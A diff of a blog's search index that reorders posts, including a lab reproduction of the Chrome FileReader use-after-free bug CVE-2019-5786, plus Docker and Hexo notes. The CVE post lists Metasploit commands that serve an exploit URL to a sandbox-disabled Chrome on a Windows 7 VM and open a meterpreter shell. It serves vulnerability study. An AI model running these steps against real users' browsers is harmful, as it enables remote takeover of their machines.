@@ -1,30 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Docker使用小记</title>
-    <url>/posts/a304692f.html</url>
-    <content><![CDATA[<blockquote>
-<p>&emsp;&emsp;Docker是一个开源的应用容器引擎，基于Go语言并遵从 Apache2.0协议开源。Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app），更重要的是容器性能开销极低。—–以上来自runoob</p>
-</blockquote>
-<h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>以MAC为例，下载链接：</p>
-<p><a href="https://download.docker.com/mac/stable/Docker.dmg">https://download.docker.com/mac/stable/Docker.dmg</a></p>
-<p>然后一步步安装即可</p>
-<h3 id="阿里云加速"><a href="#阿里云加速" class="headerlink" title="阿里云加速"></a>阿里云加速</h3><p><a href="https://yq.aliyun.com/articles/29941/">https://yq.aliyun.com/articles/29941/</a></p>
-<h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment"># 导入镜像</span></span><br><span class="line">docker pull 镜像名称</span><br><span class="line"><span class="comment"># 运行镜像（有的命令不太一样 指定端口什么的）</span></span><br><span class="line">docker run -it 镜像名称 /bin/bash</span><br><span class="line"><span class="comment"># 删除镜像 可以指定IMAGE ID</span></span><br><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>
+    <title>CVE-2019-5786（chrome_filereader_uaf）漏洞复现</title>
+    <url>/posts/d764ea3d.html</url>
+    <content><![CDATA[<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>由FileReader上的UAF漏洞可造成Chrome的远程代码执行。</p>
+<p>针对Windows7x86系统，Chrome版本72.0.3626.119。</p>
+<p>实际利用时，要配合其他漏洞如CVE-2019-0808来绕过Chrome沙箱才可以利用成功。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>受害者：win7x86虚拟机 + Chrome浏览器</p>
+<ul>
+<li><p>镜像使用<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|E812FBE758F05B485C5A858C22060785|/">cn_windows_7_professional_x86_dvd_x15-65790.iso</a></p>
+</li>
+<li><p>Chrome版本使用<a href="http://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe%EF%BC%89">72.0.3626.119_chrome_installer.exe</a></p>
+</li>
+</ul>
+<p>攻击者：MacOS + Metaspolit</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>进入Chrome安装位置，执行命令  以关闭沙箱的方式启动</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chrome.exe --no-sandbox</span><br></pre></td></tr></table></figure>
 
-<h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看容器运行状态</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 运行容器 指定CONTAINER_ID</span></span><br><span class="line">docker start container_id</span><br><span class="line"><span class="comment"># 停止运行</span></span><br><span class="line">docker stop container_id</span><br><span class="line"><span class="comment"># 进入正在运行的容器</span></span><br><span class="line">docker attach container_id</span><br><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash</span><br><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">docker rm container_id</span><br><span class="line"><span class="comment"># 导出容器</span></span><br><span class="line">docker <span class="built_in">export</span> container_id &gt; /home/iqiqiya/ubuntu-purge.tar.gz</span><br><span class="line"><span class="comment"># 导入容器</span></span><br><span class="line"><span class="comment"># 文件形式导入</span></span><br><span class="line">cat /home/iqiqiya/ubuntu.tar.gz | sudo docker import - ubuntu:14.04</span><br><span class="line"><span class="comment"># 网络导入</span></span><br><span class="line">docker import http://example.com/example.tgz example/imagere:demo</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/d764ea3d/image-20200630213752635.png" alt="image-20200630213752635"></p>
+<p>启动msf，加载模块，设置参数，执行攻击，拿到shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 搜索并选择</span></span><br><span class="line">search CVE-2019-5786</span><br><span class="line">use 0</span><br><span class="line"><span class="comment"># 查看要设置哪些参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 只用设置攻击者监听IP就可以</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># Chrome访问生成的URL</span></span><br><span class="line"><span class="comment"># http://192.168.0.5:8080/9rBZXKhXHX3og3</span></span><br><span class="line"><span class="comment"># 等几秒可以获取到session</span></span><br><span class="line">session -i 1</span><br><span class="line"><span class="comment"># 选择该session获取meterpreter会话，sysinfo查看系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 也可以直接获取目标机CMD</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 更改目标机编码为utf-8，解决显示乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment"># 弹出计算器</span></span><br><span class="line">calc</span><br></pre></td></tr></table></figure>
 
-<h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><p>本机–&gt;容器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp (本地文件路径) (docker container id):(容器中路径)</span><br></pre></td></tr></table></figure>
-
-<p>容器–&gt;本机</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp (docker container id):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure>]]></content>
+<p><img src="/posts/d764ea3d/image-20200701110357248.png" alt="image-20200701110357248"></p>
+<p><img src="/posts/d764ea3d/image-20200701110512878.png" alt="image-20200701110512878"></p>
+<p><img src="/posts/d764ea3d/image-20200701110201446.png" alt="image-20200701110201446"></p>
+<p><img src="/posts/d764ea3d/image-20200701110717635.png" alt="image-20200701110717635"></p>
+<p><img src="/posts/d764ea3d/image-20200701111415202.png" alt="image-20200701111415202"></p>
+<p><img src="/posts/d764ea3d/image-20200701111522119.png" alt="image-20200701111522119"></p>
+<p><img src="/posts/d764ea3d/image-20200701111552624.png" alt="image-20200701111552624"></p>
+<p><img src="/posts/d764ea3d/image-20200630214610496.png" alt="image-20200630214610496"></p>
+<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><ul>
+<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650944995&idx=1&sn=8dbc7e1353c77066a1318fb8dfc1f041&chksm=807977d1b70efec7023644bd9537aff02dca7ecce20e738ca2d98908d556d62ccd9538447093&mpshare=1&scene=1&srcid=0629ZY1R01MNnxvnQx4hxRbn&sharer_sharetime=1593418086197&sharer_shareid=08acff567b3294158bc829ca4ef3cb63#rd">CVE-2019-5786 漏洞原理分析及利用</a></p>
+</li>
+<li><p><a href="https://weibo.com/ttarticle/p/show?id=2309404351596157885398">CVE-2019-5786 Chrome远程代码执行漏洞分析</a></p>
+</li>
+</ul>
+]]></content>
       <categories>
-        <category>Tools</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>docker</tag>
-        <tag>tools</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -110,8 +126,8 @@
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>docker</tag>
         <tag>漏洞复现</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -143,144 +159,30 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2019-5786（chrome_filereader_uaf）漏洞复现</title>
-    <url>/posts/d764ea3d.html</url>
-    <content><![CDATA[<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>由FileReader上的UAF漏洞可造成Chrome的远程代码执行。</p>
-<p>针对Windows7x86系统，Chrome版本72.0.3626.119。</p>
-<p>实际利用时，要配合其他漏洞如CVE-2019-0808来绕过Chrome沙箱才可以利用成功。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>受害者：win7x86虚拟机 + Chrome浏览器</p>
-<ul>
-<li><p>镜像使用<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|E812FBE758F05B485C5A858C22060785|/">cn_windows_7_professional_x86_dvd_x15-65790.iso</a></p>
-</li>
-<li><p>Chrome版本使用<a href="http://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe%EF%BC%89">72.0.3626.119_chrome_installer.exe</a></p>
-</li>
-</ul>
-<p>攻击者：MacOS + Metaspolit</p>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>进入Chrome安装位置，执行命令  以关闭沙箱的方式启动</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chrome.exe --no-sandbox</span><br></pre></td></tr></table></figure>
+    <title>Docker使用小记</title>
+    <url>/posts/a304692f.html</url>
+    <content><![CDATA[<blockquote>
+<p>&emsp;&emsp;Docker是一个开源的应用容器引擎，基于Go语言并遵从 Apache2.0协议开源。Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app），更重要的是容器性能开销极低。—–以上来自runoob</p>
+</blockquote>
+<h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>以MAC为例，下载链接：</p>
+<p><a href="https://download.docker.com/mac/stable/Docker.dmg">https://download.docker.com/mac/stable/Docker.dmg</a></p>
+<p>然后一步步安装即可</p>
+<h3 id="阿里云加速"><a href="#阿里云加速" class="headerlink" title="阿里云加速"></a>阿里云加速</h3><p><a href="https://yq.aliyun.com/articles/29941/">https://yq.aliyun.com/articles/29941/</a></p>
+<h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment"># 导入镜像</span></span><br><span class="line">docker pull 镜像名称</span><br><span class="line"><span class="comment"># 运行镜像（有的命令不太一样 指定端口什么的）</span></span><br><span class="line">docker run -it 镜像名称 /bin/bash</span><br><span class="line"><span class="comment"># 删除镜像 可以指定IMAGE ID</span></span><br><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/d764ea3d/image-20200630213752635.png" alt="image-20200630213752635"></p>
-<p>启动msf，加载模块，设置参数，执行攻击，拿到shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 搜索并选择</span></span><br><span class="line">search CVE-2019-5786</span><br><span class="line">use 0</span><br><span class="line"><span class="comment"># 查看要设置哪些参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 只用设置攻击者监听IP就可以</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># Chrome访问生成的URL</span></span><br><span class="line"><span class="comment"># http://192.168.0.5:8080/9rBZXKhXHX3og3</span></span><br><span class="line"><span class="comment"># 等几秒可以获取到session</span></span><br><span class="line">session -i 1</span><br><span class="line"><span class="comment"># 选择该session获取meterpreter会话，sysinfo查看系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 也可以直接获取目标机CMD</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 更改目标机编码为utf-8，解决显示乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment"># 弹出计算器</span></span><br><span class="line">calc</span><br></pre></td></tr></table></figure>
+<h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看容器运行状态</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 运行容器 指定CONTAINER_ID</span></span><br><span class="line">docker start container_id</span><br><span class="line"><span class="comment"># 停止运行</span></span><br><span class="line">docker stop container_id</span><br><span class="line"><span class="comment"># 进入正在运行的容器</span></span><br><span class="line">docker attach container_id</span><br><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash</span><br><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">docker rm container_id</span><br><span class="line"><span class="comment"># 导出容器</span></span><br><span class="line">docker <span class="built_in">export</span> container_id &gt; /home/iqiqiya/ubuntu-purge.tar.gz</span><br><span class="line"><span class="comment"># 导入容器</span></span><br><span class="line"><span class="comment"># 文件形式导入</span></span><br><span class="line">cat /home/iqiqiya/ubuntu.tar.gz | sudo docker import - ubuntu:14.04</span><br><span class="line"><span class="comment"># 网络导入</span></span><br><span class="line">docker import http://example.com/example.tgz example/imagere:demo</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/d764ea3d/image-20200701110357248.png" alt="image-20200701110357248"></p>
-<p><img src="/posts/d764ea3d/image-20200701110512878.png" alt="image-20200701110512878"></p>
-<p><img src="/posts/d764ea3d/image-20200701110201446.png" alt="image-20200701110201446"></p>
-<p><img src="/posts/d764ea3d/image-20200701110717635.png" alt="image-20200701110717635"></p>
-<p><img src="/posts/d764ea3d/image-20200701111415202.png" alt="image-20200701111415202"></p>
-<p><img src="/posts/d764ea3d/image-20200701111522119.png" alt="image-20200701111522119"></p>
-<p><img src="/posts/d764ea3d/image-20200701111552624.png" alt="image-20200701111552624"></p>
-<p><img src="/posts/d764ea3d/image-20200630214610496.png" alt="image-20200630214610496"></p>
-<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><ul>
-<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650944995&idx=1&sn=8dbc7e1353c77066a1318fb8dfc1f041&chksm=807977d1b70efec7023644bd9537aff02dca7ecce20e738ca2d98908d556d62ccd9538447093&mpshare=1&scene=1&srcid=0629ZY1R01MNnxvnQx4hxRbn&sharer_sharetime=1593418086197&sharer_shareid=08acff567b3294158bc829ca4ef3cb63#rd">CVE-2019-5786 漏洞原理分析及利用</a></p>
-</li>
-<li><p><a href="https://weibo.com/ttarticle/p/show?id=2309404351596157885398">CVE-2019-5786 Chrome远程代码执行漏洞分析</a></p>
-</li>
-</ul>
-]]></content>
+<h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><p>本机–&gt;容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp (本地文件路径) (docker container id):(容器中路径)</span><br></pre></td></tr></table></figure>
+
+<p>容器–&gt;本机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp (docker container id):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>Tools</category>
       </categories>
       <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo博客迁移小记</title>
-    <url>/posts/253f8523.html</url>
-    <content><![CDATA[<p>黑苹果的500g硬盘容量不够了，主要是因为装好多虚拟机（哭</p>
-<p>故重回windows10怀抱，下面写下步骤，遇到的问题及解决方案。</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步，拷贝原来的文件"><a href="#第一步，拷贝原来的文件" class="headerlink" title="第一步，拷贝原来的文件"></a>第一步，拷贝原来的文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要拷贝的文件及文件夹如下所示：</span><br><span class="line">source</span><br><span class="line">themes</span><br><span class="line">_config.yml</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/253f8523/image-20201129175236497.png" alt="image-20201129175236497"></p>
-<p>可以用U盘拷贝到其他位置备用</p>
-<h3 id="第二步，建立新的依赖环境"><a href="#第二步，建立新的依赖环境" class="headerlink" title="第二步，建立新的依赖环境"></a>第二步，建立新的依赖环境</h3><p>步骤与新建hexo博客一样的，大致如下：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要安装的有：</span><br><span class="line">nodejs</span><br><span class="line">git</span><br><span class="line">hexo</span><br></pre></td></tr></table></figure>
-
-<p>安装步骤不再细说，网上教程一搜就有（逃</p>
-<p>接着新建文件夹进行初始化，本例为D:/blog</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化hexo</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment"># 初始化git</span></span><br><span class="line">git init</span><br></pre></td></tr></table></figure>
-
-<p>完成后的目录结构如下图所示：</p>
-<p><img src="/posts/253f8523/image-20201129180218814.png" alt="image-20201129180218814"></p>
-<p>安装完git之后要做以下操作：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">配置github的ssh密钥</span><br><span class="line">设置git提交信息</span><br></pre></td></tr></table></figure>
-
-<p>可参考：<a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
-<h2 id="第三步，覆盖文件"><a href="#第三步，覆盖文件" class="headerlink" title="第三步，覆盖文件"></a>第三步，覆盖文件</h2><p>将第一步备份的文件进行覆盖</p>
-<p>右键git bash here</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p>浏览器访问127.0.0.1:4000就可以看到效果啦</p>
-<hr>
-<p><strong>注意：若出现图片无法正常显示或其他问题，很大可能是因为插件不全导致，需要根据package.json文件内容，安装插件</strong></p>
-<p>例如：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br><span class="line">npm install hexo-baidu-url-submit --save</span><br><span class="line">npm install hexo-blog-encrypt --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-git-backup --save</span><br><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
-
-<h2 id="遇到的问题及解决方案"><a href="#遇到的问题及解决方案" class="headerlink" title="遇到的问题及解决方案"></a>遇到的问题及解决方案</h2><h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1:"></a>Q1:</h3><p>hexo s之后出现Validating config?</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO  Validating config</span><br><span class="line">WARN  Deprecated config detected: &quot;use_date_for_updated&quot; is deprecated, please use &quot;updated_option&quot; instead. See https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration for more details.</span><br></pre></td></tr></table></figure>
-
-<h3 id="A1"><a href="#A1" class="headerlink" title="A1:"></a>A1:</h3><p>修改_config.yml一行内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use_date_for_updated: true # deprecated</span><br><span class="line">updated_option: date # use this</span><br></pre></td></tr></table></figure>
-
-<p>可参考：<a href="https://github.com/hexojs/hexo/issues/4450">https://github.com/hexojs/hexo/issues/4450</a></p>
-<h3 id="Q2："><a href="#Q2：" class="headerlink" title="Q2："></a>Q2：</h3><p>浏览器访问出现</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and...</span><br></pre></td></tr></table></figure>
-
-<p>如下图所示：</p>
-<p><img src="/posts/253f8523/image-20201129181048024.png" alt="image-20201129181048024"></p>
-<h3 id="A2："><a href="#A2：" class="headerlink" title="A2："></a>A2：</h3><p>是因为Hexo 5将swig渲染插件移除造成</p>
-<p>解决办法，手动安装即可</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
-
-<p>可参考：<a href="https://github.com/ahonn/hexo-theme-even/issues/266">https://github.com/ahonn/hexo-theme-even/issues/266</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面两个问题都是hexo版本更新造成的，如果迁移前后hexo版本一致，就不再需要看上面的解决方案啦。</p>
-<p>遇到问题可以多看看官方文档README.md还有issues，可以更快解决哦！</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>博客迁移</tag>
-        <tag>2020</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mac OS装机系列小记</title>
-    <url>/posts/51ac3858.html</url>
-    <content><![CDATA[<p>记录下mac os平台好用的软件/工具/操作，方便下次黑苹果环境搭建</p>
-<h3 id="黑苹果安装"><a href="#黑苹果安装" class="headerlink" title="黑苹果安装"></a>黑苹果安装</h3><h4 id="远景论坛"><a href="#远景论坛" class="headerlink" title="远景论坛"></a>远景论坛</h4><p><a href="http://bbs.pcbeta.com/">http://bbs.pcbeta.com/</a></p>
-<h4 id="黑果小兵"><a href="#黑果小兵" class="headerlink" title="黑果小兵"></a>黑果小兵</h4><p><a href="https://blog.daliansky.net/">https://blog.daliansky.net/</a></p>
-<h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><p><a href="https://github.com/">https://github.com</a></p>
-<p>待续~</p>
-<h3 id="资源推荐"><a href="#资源推荐" class="headerlink" title="资源推荐"></a>资源推荐</h3><h4 id="腾讯柠檬精选"><a href="#腾讯柠檬精选" class="headerlink" title="腾讯柠檬精选"></a>腾讯柠檬精选</h4><p><a href="https://lemon.qq.com/lab/">https://lemon.qq.com/lab/</a></p>
-<p>腾讯出品，收录了一些正版、好用的Mac产品</p>
-<p>质量不错，有点评，并不是全免费</p>
-<h4 id="MacWk"><a href="#MacWk" class="headerlink" title="MacWk"></a>MacWk</h4><p><a href="https://macwk.com/">https://macwk.com/</a></p>
-<p>更新快，有特殊软件，适合学生党</p>
-<p>榜单，专题，专题必备做的都很不错</p>
-<h3 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h3><h4 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h4><p>多版本python环境必备</p>
-<h4 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h4><p>终端代理神器，可以配合v2ray</p>
-<h4 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h4><p>管理云服务器好用，支持ssh代理隧道</p>
-<h4 id="ChashX"><a href="#ChashX" class="headerlink" title="ChashX"></a>ChashX</h4><p>V2ray是mac平台目前最好用的代理客户端，没有之一</p>
-<p>支持订阅导入，自动更新；支持PAC模式，规则判断</p>
-<h4 id="HandShaker"><a href="#HandShaker" class="headerlink" title="HandShaker"></a>HandShaker</h4><p>锤子出品的，用来链接安卓手机</p>
-<h4 id="护眼宝"><a href="#护眼宝" class="headerlink" title="护眼宝"></a>护眼宝</h4><p>太真实了，程序猿刚需，个人感觉还是有点用的</p>
-<h4 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h4><p>数据库图形化管理神器</p>
-<h4 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h4><p>markdown写作利器，导入导出功能强大，所见即所得</p>
-<h4 id="腾讯柠檬清理"><a href="#腾讯柠檬清理" class="headerlink" title="腾讯柠檬清理"></a>腾讯柠檬清理</h4><p>除了清理释放内存、垃圾，还可以对摄像头、麦克风隐私保护</p>
-<h4 id="TotalFinder"><a href="#TotalFinder" class="headerlink" title="TotalFinder"></a>TotalFinder</h4><p>扩展Finder实现类似windows资源管理器，可多标签窗口</p>
-<h4 id="Downie-4"><a href="#Downie-4" class="headerlink" title="Downie 4"></a>Downie 4</h4><p>图形化界面的视频下载器，可自定义提取，比you-get更容易上手</p>
-<p>未完，待续~</p>
-]]></content>
-      <categories>
-        <category>折腾搞机</category>
-      </categories>
-      <tags>
-        <tag>Mac os</tag>
-        <tag>软件推荐</tag>
-        <tag>黑苹果安装</tag>
+        <tag>docker</tag>
+        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
@@ -427,6 +329,104 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo博客迁移小记</title>
+    <url>/posts/253f8523.html</url>
+    <content><![CDATA[<p>黑苹果的500g硬盘容量不够了，主要是因为装好多虚拟机（哭</p>
+<p>故重回windows10怀抱，下面写下步骤，遇到的问题及解决方案。</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步，拷贝原来的文件"><a href="#第一步，拷贝原来的文件" class="headerlink" title="第一步，拷贝原来的文件"></a>第一步，拷贝原来的文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要拷贝的文件及文件夹如下所示：</span><br><span class="line">source</span><br><span class="line">themes</span><br><span class="line">_config.yml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/253f8523/image-20201129175236497.png" alt="image-20201129175236497"></p>
+<p>可以用U盘拷贝到其他位置备用</p>
+<h3 id="第二步，建立新的依赖环境"><a href="#第二步，建立新的依赖环境" class="headerlink" title="第二步，建立新的依赖环境"></a>第二步，建立新的依赖环境</h3><p>步骤与新建hexo博客一样的，大致如下：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要安装的有：</span><br><span class="line">nodejs</span><br><span class="line">git</span><br><span class="line">hexo</span><br></pre></td></tr></table></figure>
+
+<p>安装步骤不再细说，网上教程一搜就有（逃</p>
+<p>接着新建文件夹进行初始化，本例为D:/blog</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化hexo</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment"># 初始化git</span></span><br><span class="line">git init</span><br></pre></td></tr></table></figure>
+
+<p>完成后的目录结构如下图所示：</p>
+<p><img src="/posts/253f8523/image-20201129180218814.png" alt="image-20201129180218814"></p>
+<p>安装完git之后要做以下操作：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">配置github的ssh密钥</span><br><span class="line">设置git提交信息</span><br></pre></td></tr></table></figure>
+
+<p>可参考：<a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
+<h2 id="第三步，覆盖文件"><a href="#第三步，覆盖文件" class="headerlink" title="第三步，覆盖文件"></a>第三步，覆盖文件</h2><p>将第一步备份的文件进行覆盖</p>
+<p>右键git bash here</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问127.0.0.1:4000就可以看到效果啦</p>
+<hr>
+<p><strong>注意：若出现图片无法正常显示或其他问题，很大可能是因为插件不全导致，需要根据package.json文件内容，安装插件</strong></p>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br><span class="line">npm install hexo-baidu-url-submit --save</span><br><span class="line">npm install hexo-blog-encrypt --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-git-backup --save</span><br><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
+
+<h2 id="遇到的问题及解决方案"><a href="#遇到的问题及解决方案" class="headerlink" title="遇到的问题及解决方案"></a>遇到的问题及解决方案</h2><h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1:"></a>Q1:</h3><p>hexo s之后出现Validating config?</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO  Validating config</span><br><span class="line">WARN  Deprecated config detected: &quot;use_date_for_updated&quot; is deprecated, please use &quot;updated_option&quot; instead. See https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration for more details.</span><br></pre></td></tr></table></figure>
+
+<h3 id="A1"><a href="#A1" class="headerlink" title="A1:"></a>A1:</h3><p>修改_config.yml一行内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use_date_for_updated: true # deprecated</span><br><span class="line">updated_option: date # use this</span><br></pre></td></tr></table></figure>
+
